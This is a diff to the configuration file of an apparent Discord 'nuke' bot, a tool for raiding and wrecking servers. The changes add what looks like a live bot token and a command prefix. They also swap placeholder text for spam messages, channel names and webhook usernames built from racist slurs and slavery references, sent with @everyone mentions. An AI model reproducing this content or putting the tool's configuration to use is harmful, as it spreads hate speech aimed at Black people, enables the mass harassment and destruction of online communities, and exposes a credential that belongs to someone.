@@ -1,11 +1,11 @@
 #BOT CONFIG
-token = ""
-prefix = ""
+token = "NzY0OTQwNDQ4NjE5NTYxMDIy.X4NkTg.0yN7a8Cj_SRVpjlzvEtJy25m24M"
+prefix = "!"
 
 #NUKE CONFIG
-spam_messages = ["@everyone nuked", "@everyone get nuked"]
-channel_names = ["nuked", "get nuked"]
-webhook_usernames = ["nuked", "get nuked"]
+spam_messages = ["@everyone GET BACK IN THE FIELDS NIGGER", "@everyone DADDYS HOME"]
+channel_names = ["DA FIELDS NIGGA", "GET ASS FUCKED"]
+webhook_usernames = ["SLAVE ", "NIGGER "]
 nuke_on_join = False
 nuke_wait_time = 0
 
